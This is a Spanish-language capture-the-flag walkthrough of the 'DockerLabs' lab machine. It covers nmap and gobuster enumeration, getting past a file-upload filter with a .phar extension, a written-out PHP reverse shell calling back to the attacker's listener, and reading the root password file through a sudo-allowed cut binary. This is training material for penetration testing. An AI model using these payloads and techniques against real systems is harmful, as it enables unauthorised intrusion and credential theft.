---
icon: flag
---

# Dockerlabs DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip dockerlabs.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh dockerlabs.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 12:03 EST
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

Si nos metemos en la pagina aparentemente no veremos nada interesante, por lo que `fuzzearemos` un poco:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 8235]
/machine.php          (Status: 200) [Size: 1361]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 200) [Size: 741]
/upload.php           (Status: 200) [Size: 0]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, entre ellas la pagina `machine.php` que nos llevara a un `upload` para poder subir un archivo, por lo que vamos a intentar crearnos una `reverse shell` subiendo un archivo `.php`.

## Escalate user www-data

Si intentamos subir un archivo directamente con `PHP` nos aparecera esto:

```
No se permite la subida de archivos que no sean .zip
```

Por lo que haremos lo siguiente:

> shell.phar

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Pondremos el archivo en extension `.phar` para `Bypassear` el verificado, por lo que lo subiremos y nos iremos a la carpeta `/uploads`:

```
URL = http://<IP>/uploads/
```

Y antes de darle a nuestro archivo nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Seleccionamos el archivo en la web y si nos vamos a donde teniamos la escucha veremos que hemos obtenido una shell:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 46552
whoami
www-data
```

## Escalate Privileges

Sanitizaremos la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on a05f02578833:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on a05f02578833:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

Por lo que vemos podemos ejecutar los binarios `cut` y `grep` como el usuario `root`, por lo que haremos lo siguiente:

Si nos vamos a `/opt` veremos una `nota.txt` que dice lo siguiente:

```
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Sabiendo esto haremos lo siguiente:

```shell
LFILE=/root/clave.txt
sudo cut -d "" -f1 "$LFILE"
```

Info:

```
dockerlabsmolamogollon123
```

Si probamos a poner como contraseña esa al usuario de `root` veremos que es dicha contraseña.

```shell
su root
```

Metemos como contraseña `dockerlabsmolamogollon123` y seremos `root`.
